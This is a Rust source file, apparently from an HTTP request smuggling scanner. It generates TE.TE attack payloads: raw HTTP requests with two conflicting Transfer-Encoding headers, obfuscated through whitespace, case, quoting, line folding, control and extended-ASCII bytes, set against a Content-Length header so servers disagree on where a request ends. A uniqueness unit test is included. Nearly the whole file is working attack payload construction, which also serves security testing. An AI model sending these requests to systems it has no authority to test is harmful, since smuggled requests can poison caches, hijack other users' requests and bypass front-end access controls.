use super::{format_cookies, format_custom_headers};

/// Generate TE.TE (Transfer-Encoding obfuscation) attack payloads.
/// These payloads use two Transfer-Encoding headers to test for parser
/// discrepancies.
///
/// Returns raw request bytes (`Vec<Vec<u8>>`) so the extended-ASCII second-header
/// variants (NEL `0x85`, NBSP `0xA0`) embed the exact byte instead of the U+FFFD
/// replacement a UTF-8 `String` would produce — which also made the two variants
/// byte-identical and thus a wasted duplicate request.
pub fn get_te_te_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<Vec<u8>> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    let te_variations: &[(&str, &str)] = &[
        // === Basic dual header variations ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding: identity"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: x-custom"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: cow"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: compress"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: deflate"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: gzip"),
        // === Reversed dual chunk (revdualchunk) ===
        ("Transfer-Encoding: identity", "Transfer-Encoding: chunked"),
        // === Combined encodings ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: gzip, chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked, identity",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity, chunked",
        ),
        // === Nested encodings (nested) ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: identity, chunked, identity",
        ),
        // === Whitespace variations for second header ===
        ("Transfer-Encoding: chunked", " Transfer-Encoding: chunked"),
        ("Transfer-Encoding: chunked", "\tTransfer-Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding : chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:\tchunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:  chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding:chunked"),
        // === Quote variations ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: \"chunked\"",
        ),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: 'chunked'"),
        // === Case variations ===
        ("Transfer-Encoding: chunked", "transfer-encoding: chunked"),
        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: CHUNKED"),
        ("Transfer-Encoding: chunked", "TRANSFER-ENCODING: chunked"),
        ("Transfer-Encoding: chunked", "TrAnSfEr-EnCoDiNg: ChUnKeD"),
        ("Transfer-Encoding: chunked", "Transfer-encoding: chunked"),
        // === Header name variations ===
        ("Transfer-Encoding: chunked", "Transfer_Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer Encoding: chunked"),
        ("Transfer-Encoding: chunked", "Transfer\\Encoding: chunked"),
        // === Line folding variations ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding:\n chunked"),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\r\n chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\r\n\tchunked",
        ),
        // === Control character variations ===
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding:\x0Bchunked",
        ),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked\r"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked\t"),
        (
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: chunked\x00",
        ),
        // === Truncated/lazygrep variation ===
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunk"),
        // === Bad setup line endings ===
        (
            "Transfer-Encoding: chunked",
            "Foo: bar\rTransfer-Encoding: chunked",
        ),
        (
            "Transfer-Encoding: chunked",
            "Foo: bar\nTransfer-Encoding: chunked",
        ),
        // === Content-Encoding confusion (contentEnc) ===
        ("Transfer-Encoding: chunked", "Content-Encoding: chunked"),
        // === URL-encoded variations ===
        ("Transfer-Encoding: chunked", "Transfer-%45ncoding: chunked"),
        // === Connection header combination ===
        (
            "Transfer-Encoding: chunked",
            "Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked",
        ),
    ];

    // Extended-ASCII second-header variations (bytes > 0x7F). The obfuscation
    // byte is spliced in raw, so the two variants (NEL vs NBSP) are genuinely
    // distinct on the wire instead of collapsing to the same U+FFFD string.
    let byte_second_header = |raw: u8| -> Vec<u8> {
        let mut v = Vec::with_capacity(b"Transfer-Encoding".len() + 1 + b": chunked".len());
        v.extend_from_slice(b"Transfer-Encoding");
        v.push(raw);
        v.extend_from_slice(b": chunked");
        v
    };
    let extended: Vec<(&[u8], Vec<u8>)> = vec![
        (b"Transfer-Encoding: chunked", byte_second_header(0x85)), // NEL
        (b"Transfer-Encoding: chunked", byte_second_header(0xA0)), // NBSP
    ];

    // Assemble a TE.TE request from two raw Transfer-Encoding header lines.
    // `Content-Length: 4` frames `1\r\nA` for a CL parser; the chunked body
    // `1\r\nA\r\n0\r\n\r\n` is what a TE parser consumes.
    let assemble = |te1: &[u8], te2: &[u8]| -> Vec<u8> {
        let head = format!(
            "{method} {path} HTTP/1.1\r\n\
             Host: {host}\r\n\
             {custom_header_str}\
             {cookie_str}\
             Content-Length: 4\r\n"
        );
        let mut req = Vec::with_capacity(head.len() + te1.len() + te2.len() + 24);
        req.extend_from_slice(head.as_bytes());
        req.extend_from_slice(te1);
        req.extend_from_slice(b"\r\n");
        req.extend_from_slice(te2);
        req.extend_from_slice(b"\r\n\r\n1\r\nA\r\n0\r\n\r\n");
        req
    };

    let mut payloads: Vec<Vec<u8>> = Vec::with_capacity(te_variations.len() + extended.len());
    for (te1, te2) in te_variations {
        payloads.push(assemble(te1.as_bytes(), te2.as_bytes()));
    }
    for (te1, te2) in &extended {
        payloads.push(assemble(te1, te2));
    }

    // The curated header pairs above are distinct, and the two extended-ASCII
    // variants now carry different raw bytes (0x85 vs 0xA0), so the assembled
    // requests are unique — no runtime dedup pass is needed (its distinctness is
    // guarded by `all_te_te_payloads_are_unique`).
    payloads
}

#[cfg(test)]
mod tests {
    use super::get_te_te_payloads;
    use std::collections::HashSet;

    #[test]
    fn all_te_te_payloads_are_unique() {
        // No dedup pass runs at generation time, so a duplicate curated pair (or
        // two extended variants that collapse to identical bytes — the pre-fix
        // NEL/NBSP bug) would silently send the same request twice. Guard it here.
        let payloads = get_te_te_payloads("/", "example.com", "POST", &[], &[]);
        let unique: HashSet<&Vec<u8>> = payloads.iter().collect();
        assert_eq!(
            payloads.len(),
            unique.len(),
            "get_te_te_payloads must not produce byte-identical duplicate requests"
        );
    }
}
